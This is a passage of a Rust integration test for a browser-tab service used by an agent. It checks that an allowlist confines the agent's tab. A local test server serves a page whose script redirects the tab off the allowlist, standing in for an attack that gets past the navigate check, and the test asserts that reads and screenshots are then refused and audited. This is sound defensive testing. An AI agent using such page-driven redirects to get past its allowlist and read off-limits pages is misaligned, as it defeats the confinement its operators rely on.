    /// of the tab succeeds — i.e. the grant path really does reach a live page
    /// in the persistent context, so the 403s above are refusals rather than
    /// something that was broken anyway.
    #[tokio::test]
    #[ignore = "spawns a real chrome-headless-shell; run with --ignored on a box that has the pinned binary"]
    async fn real_chrome_an_agent_cannot_navigate_a_granted_tab_off_its_allowlist() {
        let (state, dir) = test_state().await;
        if !state.browser.config().executable.exists() {
            eprintln!("SKIP: no chrome at {}", state.browser.config().executable.display());
            std::fs::remove_dir_all(&dir).ok();
            return;
        }
        seed_session(&state, "alice", "tok-alice", true).await;
        // `data:` URLs carry no host, so the allowlist is exercised with two
        // real loopback origins instead — `127.0.0.1` is allowed, `localhost` is
        // the same server under a DIFFERENT host, which is exactly the shape of
        // the same-site-attacker case the allowlist exists for.
        // Two paths on ONE server: `/` is an ordinary page, `/go` is a page that
        // takes itself off-allowlist the moment it loads — the site-driven half
        // of the exploit, which `navigate`'s destination check cannot see.
        let (url, server, port) = {
            let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
            let addr = listener.local_addr().unwrap();
            let port = addr.port();
            let handle = tokio::spawn(async move {
                loop {
                    let Ok((mut sock, _)) = listener.accept().await else { return };
                    tokio::spawn(async move {
                        use tokio::io::{AsyncReadExt, AsyncWriteExt};
                        let mut buf = [0u8; 1024];
                        let n = sock.read(&mut buf).await.unwrap_or(0);
                        let req = String::from_utf8_lossy(&buf[..n]).to_string();
                        let body = if req.contains("GET /go") {
                            format!(
                                "<title>drift</title><body>redirecting<script>\
                                 location.replace('http://localhost:{port}/');</script></body>"
                            )
                        } else {
                            "<title>allowed</title><body>on-allowlist</body>".to_string()
                        };
                        let resp = format!(
                            "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                            body.len(),
                            body
                        );
                        let _ = sock.write_all(resp.as_bytes()).await;
                        let _ = sock.flush().await;
                    });
                }
            });
            (format!("http://127.0.0.1:{port}/"), handle, port)
        };
        let off_host = url.replace("127.0.0.1", "localhost");
        let drift_url = format!("http://127.0.0.1:{port}/go");

        crate::db::browser_tabs::create(
            &state.pool,
            "tb_originscope1",
            &url,
            None,
            &["127.0.0.1".to_string()],
        )
        .await
        .unwrap();
        crate::db::browser_tabs::grant(&state.pool, "tb_originscope1", "alice", true)
            .await
            .unwrap();

        // On-allowlist: allowed.
        let (st, v) = call(
            &state,
            "alice",
            "tok-alice",
            "navigate",
            json!({ "tab": "tb_originscope1", "url": url }),
        )
        .await;
        assert_eq!(st, StatusCode::OK, "on-allowlist navigation: {v}");

        // Off-allowlist: refused, and the page has NOT moved.
        let (st, v) = call(
            &state,
            "alice",
            "tok-alice",
            "navigate",
            json!({ "tab": "tb_originscope1", "url": off_host }),
        )
        .await;
        assert_eq!(st, StatusCode::FORBIDDEN, "off-allowlist navigation: {v}");

        let (st, v) = call(
            &state,
            "alice",
            "tok-alice",
            "read",
            json!({ "tab": "tb_originscope1" }),
        )
        .await;
        assert_eq!(st, StatusCode::OK, "a granted read must work: {v}");
        assert!(
            v["result"]["text"].as_str().unwrap_or_default().contains("on-allowlist"),
            "the tab is still on the page it was allowed to reach: {v}"
        );
        assert!(
            v["result"]["url"].as_str().unwrap_or_default().contains("127.0.0.1"),
            "the refused navigation must not have moved the page: {v}"
        );

        // A javascript: URL can never satisfy the allowlist.
        let (st, _) = call(
            &state,
            "alice",
            "tok-alice",
            "navigate",
            json!({ "tab": "tb_originscope1", "url": "javascript:1" }),
        )
        .await;
        assert_eq!(st, StatusCode::FORBIDDEN);

        // ── THE LANDING HALF ────────────────────────────────────────────────
        // Navigate to an ON-allowlist URL whose PAGE then takes the tab
        // off-allowlist. `navigate` approved the destination and never sees
        // where the tab ends up; before the landing check, the read below
        // happily returned the off-allowlist page.
        let (st, _) = call(
            &state,
            "alice",
            "tok-alice",
            "navigate",
            json!({ "tab": "tb_originscope1", "url": drift_url }),
        )
        .await;
        // Either the redirect landed inside `navigate` (403, the landing check
        // firing on navigate itself) or it landed just after (200). Both are
        // correct; what must NOT be possible is reading the result.
        assert!(
            st == StatusCode::OK || st == StatusCode::FORBIDDEN,
            "unexpected navigate status {st}"
        );

        let mut refused = None;
        for _ in 0..40 {
            let (st, v) = call(
                &state,
                "alice",
                "tok-alice",
                "read",
                json!({ "tab": "tb_originscope1" }),
            )
            .await;
            if st == StatusCode::FORBIDDEN {
                refused = Some(v);
                break;
            }
            // Still on the redirecting page — it must at least not be the
            // off-allowlist one already.
            assert!(
                !v["result"]["url"]
                    .as_str()
                    .unwrap_or_default()
                    .contains("localhost"),
                "an off-allowlist page was READ — the landing check did not fire: {v}"
            );
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        let refused = refused.expect("the drifted tab must eventually refuse a read");
        assert!(
            refused["error"]
                .as_str()
                .unwrap_or_default()
                .contains("localhost"),
            "the refusal names the host the human would have to allow: {refused}"
        );

        // A screenshot of the same drifted page is refused for the same reason —
        // a picture of an off-allowlist page is the same exfiltration as its text.
        let (st, _) = call(
            &state,
            "alice",
            "tok-alice",
            "screenshot",
            json!({ "tab": "tb_originscope1" }),
        )
        .await;
        assert_eq!(st, StatusCode::FORBIDDEN, "screenshot must refuse too");

        // The drift is on the record even though every read was refused, so a
        // tab that keeps wandering is visible in its activity trail.
        let drifts: Vec<String> = sqlx::query_scalar(
            "SELECT action FROM audit_log WHERE target = ? ORDER BY id",
        )
        .bind("tab:tb_originscope1")
        .fetch_all(&state.pool)
        .await
        .unwrap_or_default();
        assert!(
            drifts.iter().any(|a| a == "browser.off_allowlist"),
            "an off-allowlist landing must write its own audit entry: {drifts:?}"
        );

        state.browser.shutdown().await;
        server.abort();
        std::fs::remove_dir_all(&dir).ok();
    }
}
